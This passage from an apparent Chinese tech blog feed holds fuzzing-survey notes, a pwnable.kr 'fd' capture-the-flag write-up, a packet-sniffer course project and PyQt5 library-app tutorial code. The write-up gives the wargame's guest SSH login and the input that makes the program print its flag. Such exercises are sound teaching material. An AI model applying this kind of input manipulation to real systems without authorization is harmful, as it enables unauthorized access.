Sanitizer</p></li><li><p>Input Validation：KameleonFuzz、μ4SQLi</p></li><li><p>Semantic Difference：black-box differential fuzz</p></li></ul><h3><span id="pexecution-optimizations">Execution Optimizations</span><a href="#pexecution-optimizations" class="header-anchor">#</a></h3><p>由于需要频繁运行程序，所以需要进行执行优化。例如函数级别的fuzz、通过fork已有的进程来免去加载时间等等</p><h3><span id="ptriage">Triage</span><a href="#ptriage" class="header-anchor">#</a></h3><p>分类是分析和报告导致违反策略的测试用例的过程。分类可以分为三个步骤：重复数据消除、优先级划分和测试用例最小化。</p><ul><li>重复数据消除方法：Stack Backtrace Hashing、Coverage-based Deduplication、Semantics-aware Deduplication</li><li>Prioritization and Exploitability：著名的有WinDbg的自动检测能够被利用!expoitable</li><li>Test case minimization：例如BFF、AFL等fuzzer使用的策略</li></ul><h2><span id="pconfiguration-updating">CONFIGURATION UPDATING</span><a href="#pconfiguration-updating" class="header-anchor">#</a></h2><p>黑盒、白盒、灰盒fuzzing在这一个步骤上区别很大</p><ul><li>Evolutionary Algorithm：维护seed pool，使其尽可能到达更多的路径</li><li>Maintaining a Minset：最小化测试用例集合，最大化覆盖率</li></ul><h2><span id="pge-ren-gan-jue">个人感觉</span><a href="#pge-ren-gan-jue" class="header-anchor">#</a></h2><p>整体上写了很多，并且分类也十分细致，抽取出了一个fuzzer的框架，但东西太多，点到为止。</p><p>看完其他的fuzzing paper再回来看这篇论文收获会更大。</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— fd</title>
    <url>/98f1adad.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy! what is a file descriptor in Linux?</span><br><span class="line"></span><br><span class="line">* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:</span><br><span class="line">https:&#x2F;&#x2F;youtu.be&#x2F;971eZhMHQQw</span><br><span class="line"></span><br><span class="line">ssh fd@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上查看<code>ssh fd@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h3><span id="pfd-c">fd.c</span><a href="#pfd-c" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	if(argc&lt;2)&#123;</span><br><span class="line">		printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	int fd &#x3D; atoi( argv[1] ) - 0x1234;</span><br><span class="line">	int len &#x3D; 0;</span><br><span class="line">	len &#x3D; read(fd, buf, 32);</span><br><span class="line">	if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">		printf(&quot;good job :)\n&quot;);</span><br><span class="line">		system(&quot;&#x2F;bin&#x2F;cat flag&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;learn about Linux file IO\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>当运行可执行程序<code>fd</code>后，会计算变量<code>fd</code>的值，然后作为<code>read</code>函数的参数对<code>read</code>函数进行调用<br><code>read</code>函数：</p><ul><li><code>fd</code>为0 ：标准输入</li><li><code>fd</code>为1 ：标准输出</li><li><code>fd</code>为2 ：标准错误输出</li></ul><p>所以在这里我们需要是<code>fd</code>为0，然后输入字符串<code>LETMEWIN</code>给<code>buf</code>，这样判断<code>strcmp(&quot;LETMEWIN\n&quot;, buf)</code>的结果为0，从而运行<code>system</code>函数可以查看到<code>flag</code></p><p>所以<code>atoi(argv[1])</code>的值应该等于<code>0x1234</code>,其十进制值为4660</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fd@ubuntu:~$ .&#x2F;fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>mommy! I think I know what a file descriptor is!!</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5+Scapy实现网络嗅探器CloudSniffer</title>
    <url>/e6624f61.html</url>
    <content><![CDATA[<h1><span id="cloudsniffer">CloudSniffer</span><a href="#cloudsniffer" class="header-anchor">#</a></h1><blockquote><p>课程实验，使用Scapy和PyQt5 实现了 一款Mac上的网络嗅探工具</p></blockquote><p><a href="https://github.com/ycdxsb/CloudSniffer" target="_blank" rel="noopener">CloudSniffer的Github链接</a></p><a id="more"></a><h4><span id="pgong-neng">功能</span><a href="#pgong-neng" class="header-anchor">#</a></h4><p><strong>基本功能</strong>：</p><ul><li>网卡选择</li><li>开始、停止抓包</li><li>清除数据</li><li>保存数据</li><li>读取数据</li><li>退出程序</li><li>流量包基本信息显示</li><li>协议分析</li><li>hexdump内容</li></ul><p><strong>统计功能</strong></p><ul><li><p>流量协议统计（帧数、字节数）</p></li><li><p>流入流量统计（帧数、字节数）</p></li><li><p>流出流量统计（帧数、字节数）</p></li><li><p>流量时间统计（字节数）</p></li><li><p>IP所在地查询</p></li></ul><p><strong>其他功能</strong></p><ul><li>嗅探前过滤、嗅探后过滤</li><li>html内容提取</li><li>日志记录</li></ul><h4><span id="pxiao-guo-zhan-shi">效果展示</span><a href="#pxiao-guo-zhan-shi" class="header-anchor">#</a></h4><p><strong>基本界面</strong></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135028.jpg" alt="basic"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135122.gif" alt="basic"></p><p><strong>统计功能</strong></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135217.jpg" alt="statistics"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135231.gif" alt="statistics"></p><p><strong>提取html内容</strong></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135239.jpg" alt="extractHTML"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135231.gif" alt="extractHTML"></p><h4><span id="pan-zhuang-shi-yong">安装使用</span><a href="#pan-zhuang-shi-yong" class="header-anchor">#</a></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/ycdxsb/CloudSniffer.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ./CloudSniffer</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> pip3 install requirements.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 CloudSniffer.py</span></span><br></pre></td></tr></table></figure><h4><span id="pcan-kao">参考</span><a href="#pcan-kao" class="header-anchor">#</a></h4><ul><li><a href="https://github.com/invernizzi/scapy-http" target="_blank" rel="noopener">scapy-http</a></li><li><a href="https://github.com/HatBoy/Pcap-Analyzer" target="_blank" rel="noopener">Pcap-Analyser</a></li></ul>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（11）——窗口信号与槽以及主窗口循环(项目完)</title>
    <url>/9f815f0d.html</url>
    <content><![CDATA[<h2><span id="pguan-li-yuan-zhu-ye-xin-hao-yu-cao">管理员主页信号与槽</span><a href="#pguan-li-yuan-zhu-ye-xin-hao-yu-cao" class="header-anchor">#</a></h2><h3><span id="pchuang-kou-nei-xin-hao-yu-cao">窗口内信号与槽</span><a href="#pchuang-kou-nei-xin-hao-yu-cao" class="header-anchor">#</a></h3><p>在管理员主页代码的<code>setUpUI</code>中，可以看到如下代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">self.addBookButton.clicked.connect(self.addBookButtonClicked)</span><br><span class="line">        self.dropBookButton.clicked.connect(self.dropBookButtonClicked)</span><br><span class="line">        self.userManageButton.clicked.connect(self.userManage)</span><br></pre></td></tr></table></figure><p>这是Qt自带的信号与槽机制，也就是<code>QPushButton</code>点击触发，分别是</p><ul><li>添加书籍按钮点击触发弹出添加书籍对话框</li><li>淘汰书籍按钮点击触发弹出淘汰书籍对话框</li><li>用户管理按钮点击弹出用户管理对话框</li></ul><a id="more"></a><h3><span id="pchuang-kou-jian-xin-hao-yu-cao">窗口间信号与槽</span><a href="#pchuang-kou-jian-xin-hao-yu-cao" class="header-anchor">#</a></h3><p>在管理员主页代码中的<code>addBookButtonClicked</code>和<code>dropBookButtonClicked</code>函数中，可以看到这样两行代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addDialog.add_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dropDialog.drop_book_successful_signal.connect(self.storageView.searchButtonClicked)</span><br></pre></td></tr></table></figure><p>同样的，我们找一下发送信号方的信号定义<br>在<code>borrowBookDialog</code>中有<code>borrow_book_success_signal = pyqtSignal()</code><br>同时可以在<code>borrowButtonClicked</code>函数中看到，当成功添加书籍时会发送信号<br>而我们在管理员主页中，将这个信号与库存查询组件的的<code>searchButtonClicked</code>连接，也就是实现了当书籍添加时，动态刷新库存。<br>UI交互良好</p><p>另一个也是一样，就不赘述了</p><h2><span id="pxue-sheng-yong-hu-zhu-ye-xin-hao-yu-cao">学生用户主页信号与槽</span><a href="#pxue-sheng-yong-hu-zhu-ye-xin-hao-yu-cao" class="header-anchor">#</a></h2><h3><span id="pchuang-kou-nei-xin-hao-yu-cao">窗口内信号与槽</span><a href="#pchuang-kou-nei-xin-hao-yu-cao" class="header-anchor">#</a></h3><p>与管理员主页一样，可以找到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">self.borrowBookButton.clicked.connect(self.borrowBookButtonClicked)</span><br><span class="line">       self.returnBookButton.clicked.connect(self.returnBookButtonClicked)</span><br><span class="line">       self.myBookStatus.clicked.connect(self.myBookStatusClicked)</span><br><span class="line">       self.allBookButton.clicked.connect(self.allBookButtonClicked)</span><br></pre></td></tr></table></figure><h3><span id="pchuang-kou-jian-xin-hao-yu-cao">窗口间信号与槽</span><a href="#pchuang-kou-jian-xin-hao-yu-cao" class="header-anchor">#</a></h3><p>在<code>borrowBookButtonClicked</code>函数可以找到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">borrowDialog.borrow_book_success_signal.connect(self.borrowStatusView.borrowedQuery)</span><br><span class="line">        borrowDialog.borrow_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br></pre></td></tr></table></figure><p>这里既要刷新库存显示，同时也要刷新借书状态显示</p><p>在<code>returnBookButtonClicked</code>函数可以找到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">returnDialog.return_book_success_signal.connect(self.borrowStatusView.returnedQuery)</span><br><span class="line">       returnDialog.return_book_success_signal.connect(self.borrowStatusView.borrowedQuery)</span><br><span class="line">       returnDialog.return_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br></pre></td></tr></table></figure><p>效果也是一样</p><h2><span id="pzhu-chuang-kou-xun-huan">主窗口循环</span><a href="#pzhu-chuang-kou-xun-huan" class="header-anchor">#</a></h2><p>在菜单栏中，有注册、修改密码、登录账户、退出登录、退出可以点击<br>当然其能否点击需要根据当前窗口决定，比如如果已登录，当然就不能点击登录和修改密码了<br>至于窗口的<code>setCentralWidget</code>调用，比如输入密码，是切换到用户主页还是到管理员主页，当然是看发射的信号是什么啦</p><h3><span id="pshi-xian-dai-ma">实现代码</span><a href="#pshi-xian-dai-ma" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import QIcon, QFont</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">from SignIn import SignInWidget</span><br><span class="line">from SignUp import SignUpWidget</span><br><span class="line">import sip</span><br><span class="line">from AdminHome import AdminHome</span><br><span class="line">from StudentHome import StudentHome</span><br><span class="line">from changePasswordDialog import changePasswordDialog</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Main(QMainWindow):</span><br><span class="line">    def __init__(self, parent&#x3D;None):</span><br><span class="line">        super(Main, self).__init__(parent)</span><br><span class="line">        self.layout &#x3D; QHBoxLayout()</span><br><span class="line">        self.widget &#x3D; SignInWidget()</span><br><span class="line">        self.resize(900, 600)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎登陆图书馆管理系统&quot;)</span><br><span class="line">        self.setCentralWidget(self.widget)</span><br><span class="line">        bar &#x3D; self.menuBar()</span><br><span class="line">        self.Menu &#x3D; bar.addMenu(&quot;菜单栏&quot;)</span><br><span class="line">        self.signUpAction &#x3D; QAction(&quot;注册&quot;, self)</span><br><span class="line">        self.changePasswordAction &#x3D;QAction(&quot;修改密码&quot;,self)</span><br><span class="line">        self.signInAction &#x3D; QAction(&quot;登录&quot;, self)</span><br><span class="line">        self.quitSignInAction &#x3D; QAction(&quot;退出登录&quot;, self)</span><br><span class="line">        self.quitAction &#x3D; QAction(&quot;退出&quot;, self)</span><br><span class="line">        self.Menu.addAction(self.signUpAction)</span><br><span class="line">        self.Menu.addAction(self.changePasswordAction)</span><br><span class="line">        self.Menu.addAction(self.signInAction)</span><br><span class="line">        self.Menu.addAction(self.quitSignInAction)</span><br><span class="line">        self.Menu.addAction(self.quitAction)</span><br><span class="line">        self.signUpAction.setEnabled(True)</span><br><span class="line">        self.changePasswordAction.setEnabled(True)</span><br><span class="line">        self.signInAction.setEnabled(False)</span><br><span class="line">        self.quitSignInAction.setEnabled(False)</span><br><span class="line">        self.widget.is_admin_signal.connect(self.adminSignIn)</span><br><span class="line">        self.widget.is_student_signal[str].connect(self.studentSignIn)</span><br><span class="line">        self.Menu.triggered[QAction].connect(self.menuTriggered)</span><br><span class="line"></span><br><span class="line">    def adminSignIn(self):</span><br><span class="line">        sip.delete(self.widget)</span><br><span class="line">        self.widget &#x3D; AdminHome()</span><br><span class="line">        self.setCentralWidget(self.widget)</span><br><span class="line">        self.changePasswordAction.setEnabled(False)</span><br><span class="line">        self.signUpAction.setEnabled(True)</span><br><span class="line">        self.signInAction.setEnabled(False)</span><br><span class="line">        self.quitSignInAction.setEnabled(True)</span><br><span class="line"></span><br><span class="line">    def studentSignIn(self, studentId):</span><br><span class="line">        sip.delete(self.widget)</span><br><span class="line">        self.widget &#x3D; StudentHome(studentId)</span><br><span class="line">        self.setCentralWidget(self.widget)</span><br><span class="line">        self.changePasswordAction.setEnabled(False)</span><br><span class="line">        self.signUpAction.setEnabled(True)</span><br><span class="line">        self.signInAction.setEnabled(False)</span><br><span class="line">        self.quitSignInAction.setEnabled(True)</span><br><span class="line"></span><br><span class="line">    def menuTriggered(self, q):</span><br><span class="line">        if(q.text()&#x3D;&#x3D;&quot;修改密码&quot;):</span><br><span class="line">            changePsdDialog&#x3D;changePasswordDialog(self)</span><br><span class="line">            changePsdDialog.show()</span><br><span class="line">            changePsdDialog.exec_()</span><br><span class="line">        if (q.text() &#x3D;&#x3D; &quot;注册&quot;):</span><br><span class="line">            sip.delete(self.widget)</span><br><span class="line">            self.widget &#x3D; SignUpWidget()</span><br><span class="line">            self.setCentralWidget(self.widget)</span><br><span class="line">            self.widget.student_signup_signal[str].connect(self.studentSignIn)</span><br><span class="line">            self.signUpAction.setEnabled(False)</span><br><span class="line">            self.changePasswordAction.setEnabled(True)</span><br><span class="line">            self.signInAction.setEnabled(True)</span><br><span class="line">            self.quitSignInAction.setEnabled(False)</span><br><span class="line">        if (q.text() &#x3D;&#x3D; &quot;退出登录&quot;):</span><br><span class="line">            sip.delete(self.widget)</span><br><span class="line">            self.widget &#x3D; SignInWidget()</span><br><span class="line">            self.setCentralWidget(self.widget)</span><br><span class="line">            self.widget.is_admin_signal.connect(self.adminSignIn)</span><br><span class="line">            self.widget.is_student_signal[str].connect(self.studentSignIn)</span><br><span class="line">            self.signUpAction.setEnabled(True)</span><br><span class="line">            self.changePasswordAction.setEnabled(True)</span><br><span class="line">            self.signInAction.setEnabled(False)</span><br><span class="line">            self.quitSignInAction.setEnabled(False)</span><br><span class="line">        if (q.text() &#x3D;&#x3D; &quot;登录&quot;):</span><br><span class="line">            sip.delete(self.widget)</span><br><span class="line">            self.widget &#x3D; SignInWidget()</span><br><span class="line">            self.setCentralWidget(self.widget)</span><br><span class="line">            self.widget.is_admin_signal.connect(self.adminSignIn)</span><br><span class="line">            self.widget.is_student_signal[str].connect(self.studentSignIn)</span><br><span class="line">            self.signUpAction.setEnabled(True)</span><br><span class="line">            self.changePasswordAction.setEnabled(True)</span><br><span class="line">            self.signInAction.setEnabled(False)</span><br><span class="line">            self.quitSignInAction.setEnabled(False)</span><br><span class="line">        if (q.text() &#x3D;&#x3D; &quot;退出&quot;):</span><br><span class="line">            qApp &#x3D; QApplication.instance()</span><br><span class="line">            qApp.quit()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; Main()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135826.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135830.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135835.jpg" alt="这里写图片描述"></p><h2><span id="pfu-shang-lian-jie">附上链接</span><a href="#pfu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p><h2><span id="pyi-xie-gan-xiang">一些感想</span><a href="#pyi-xie-gan-xiang" class="header-anchor">#</a></h2><blockquote><p>这个项目写了大概四天的样子，同时也是第一次使用Qt，很多机制其实自己都不太熟悉，像主窗口的切换，都处理的很潦草，移出控件都强行使用<code>sip.delete</code>删除。</p><p>Qt东西很多，但使用的时候去查阅一下就好了，前几天的大作业评比，感觉自己做的还是不够好，主要是功能不够全面。</p><p>一开始想先写完再说，到时候重构就是了，但最后又没有心思重构 。</p><p>希望下次做项目的时候，自己可以想好了再出发</p></blockquote>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（10）—— 学生主页以及修改代码</title>
    <url>/77aca64.html</url>
    <content><![CDATA[<h2><span id="pxue-sheng-zhu-ye-she-ji">学生主页设计</span><a href="#pxue-sheng-zhu-ye-she-ji" class="header-anchor">#</a></h2><h3><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h3><p>在学生主页，主要实现以下功能：<br>1、借阅书籍<br>2、归还书籍<br>3、借阅状态查询<br>4、书籍库存查询<br>使用四个<code>QPushButton</code>，分别用于弹出借阅书籍对话框、归还书籍对话框 、切换到借阅状态查询、切换到书籍库存查询</p><a id="more"></a><h3><span id="pshi-xian-dai-ma">实现代码</span><a href="#pshi-xian-dai-ma" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import QIcon, QFont</span><br><span class="line">from PyQt5.QtCore import Qt</span><br><span class="line">import sip</span><br><span class="line">import qdarkstyle</span><br><span class="line">from BookStorageViewer import BookStorageViewer</span><br><span class="line">from borrowBookDialog import borrowBookDialog</span><br><span class="line">from returnBookDialog import returnBookDialog</span><br><span class="line">from BorrowStatusViewer import BorrowStatusViewer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class StudentHome(QWidget):</span><br><span class="line">    def __init__(self, studentId):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.StudentId &#x3D; studentId</span><br><span class="line">        self.resize(900, 600)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        # 总布局</span><br><span class="line">        self.layout &#x3D; QHBoxLayout(self)</span><br><span class="line">        # 按钮布局</span><br><span class="line">        self.buttonLayout &#x3D; QVBoxLayout()</span><br><span class="line">        # 按钮</span><br><span class="line">        self.borrowBookButton &#x3D; QPushButton(&quot;借书&quot;)</span><br><span class="line">        self.returnBookButton &#x3D; QPushButton(&quot;还书&quot;)</span><br><span class="line">        self.myBookStatus &#x3D; QPushButton(&quot;借阅状态&quot;)</span><br><span class="line">        self.allBookButton &#x3D; QPushButton(&quot;所有书籍&quot;)</span><br><span class="line">        self.buttonLayout.addWidget(self.borrowBookButton)</span><br><span class="line">        self.buttonLayout.addWidget(self.returnBookButton)</span><br><span class="line">        self.buttonLayout.addWidget(self.myBookStatus)</span><br><span class="line">        self.buttonLayout.addWidget(self.allBookButton)</span><br><span class="line">        self.borrowBookButton.setFixedWidth(100)</span><br><span class="line">        self.borrowBookButton.setFixedHeight(42)</span><br><span class="line">        self.returnBookButton.setFixedWidth(100)</span><br><span class="line">        self.returnBookButton.setFixedHeight(42)</span><br><span class="line">        self.myBookStatus.setFixedWidth(100)</span><br><span class="line">        self.myBookStatus.setFixedHeight(42)</span><br><span class="line">        self.allBookButton.setFixedWidth(100)</span><br><span class="line">        self.allBookButton.setFixedHeight(42)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.borrowBookButton.setFont(font)</span><br><span class="line">        self.returnBookButton.setFont(font)</span><br><span class="line">        self.myBookStatus.setFont(font)</span><br><span class="line">        self.allBookButton.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.storageView &#x3D; BookStorageViewer()</span><br><span class="line">        self.borrowStatusView&#x3D;BorrowStatusViewer(self.StudentId)</span><br><span class="line">        self.allBookButton.setEnabled(False)</span><br><span class="line"></span><br><span class="line">        self.layout.addLayout(self.buttonLayout)</span><br><span class="line">        self.layout.addWidget(self.storageView)</span><br><span class="line">        self.borrowBookButton.clicked.connect(self.borrowBookButtonClicked)</span><br><span class="line">        self.returnBookButton.clicked.connect(self.returnBookButtonClicked)</span><br><span class="line">        self.myBookStatus.clicked.connect(self.myBookStatusClicked)</span><br><span class="line">        self.allBookButton.clicked.connect(self.allBookButtonClicked)</span><br><span class="line"></span><br><span class="line">    def borrowBookButtonClicked(self):</span><br><span class="line">        borrowDialog &#x3D; borrowBookDialog(self.StudentId,self)</span><br><span class="line">        borrowDialog.borrow_book_success_signal.connect(self.borrowStatusView.borrowedQuery)</span><br><span class="line">        borrowDialog.borrow_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br><span class="line">        borrowDialog.show()</span><br><span class="line">        borrowDialog.exec_()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def returnBookButtonClicked(self):</span><br><span class="line">        returnDialog &#x3D; returnBookDialog(self.StudentId,self)</span><br><span class="line">        returnDialog.return_book_success_signal.connect(self.borrowStatusView.returnedQuery)</span><br><span class="line">        returnDialog.return_book_success_signal.connect(self.borrowStatusView.borrowedQuery)</span><br><span class="line">        returnDialog.return_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br><span class="line">        returnDialog.show()</span><br><span class="line">        returnDialog.exec_()</span><br><span class="line"></span><br><span class="line">    def myBookStatusClicked(self):</span><br><span class="line">        self.layout.removeWidget(self.storageView)</span><br><span class="line">        sip.delete(self.storageView)</span><br><span class="line">        self.storageView &#x3D; BookStorageViewer()</span><br><span class="line">        self.borrowStatusView &#x3D; BorrowStatusViewer(self.StudentId)</span><br><span class="line">        self.layout.addWidget(self.borrowStatusView)</span><br><span class="line">        self.allBookButton.setEnabled(True)</span><br><span class="line">        self.myBookStatus.setEnabled(False)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def allBookButtonClicked(self):</span><br><span class="line">        self.layout.removeWidget(self.borrowStatusView)</span><br><span class="line">        sip.delete(self.borrowStatusView)</span><br><span class="line">        self.borrowStatusView &#x3D; BorrowStatusViewer(self.StudentId)</span><br><span class="line">        self.storageView &#x3D; BookStorageViewer()</span><br><span class="line">        self.layout.addWidget(self.storageView)</span><br><span class="line">        self.allBookButton.setEnabled(False)</span><br><span class="line">        self.myBookStatus.setEnabled(True)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; StudentHome(&quot;PB15000135&quot;)</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135747.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135755.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135800.jpg" alt="这里写图片描述"></p><h2><span id="pxiu-gai-mi-ma-gong-neng">修改密码功能</span><a href="#pxiu-gai-mi-ma-gong-neng" class="header-anchor">#</a></h2><blockquote><p>修改密码功能使用菜单栏<code>QAction</code>点击启动</p></blockquote><h3><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h3><p>修改密码，主要需要用户输入学号， 原密码，新密码，确认密码实现<br>代码逻辑如下：</p><ul><li>确认学号与原密码对应，否则报错</li><li>输入新密码与确认密码 ，如果相同，则md5加密后放入数据库中</li><li>注意设置输入校验</li></ul><p>使用对话框实现</p><h3><span id="pdai-ma-shi-xian">代码实现</span><a href="#pdai-ma-shi-xian" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">import time</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class changePasswordDialog(QDialog):</span><br><span class="line">    def __init__(self, parent&#x3D;None):</span><br><span class="line">        super(changePasswordDialog, self).__init__(parent)</span><br><span class="line">        self.setWindowModality(Qt.WindowModal)</span><br><span class="line">        self.setWindowTitle(&quot;修改密码&quot;)</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.resize(300, 280)</span><br><span class="line">        self.layout &#x3D; QFormLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        self.titlelabel &#x3D; QLabel(&quot; 修改密码&quot;)</span><br><span class="line">        self.studentIdLabel &#x3D; QLabel(&quot;学    号：&quot;)</span><br><span class="line">        # self.studentNameLabel&#x3D;QLabel(&quot;姓    名：&quot;)</span><br><span class="line">        self.oldPasswordLabel &#x3D; QLabel(&quot;旧 密 码：&quot;)</span><br><span class="line">        self.passwordLabel &#x3D; QLabel(&quot;新 密 码：&quot;)</span><br><span class="line">        self.confirmPasswordLabel &#x3D; QLabel(&quot;确认密码：&quot;)</span><br><span class="line"></span><br><span class="line">        self.studentIdEdit &#x3D; QLineEdit()</span><br><span class="line">        # self.studentNameEdit&#x3D;QLineEdit()</span><br><span class="line">        self.oldPasswordEdit &#x3D; QLineEdit()</span><br><span class="line">        self.passwordEdit 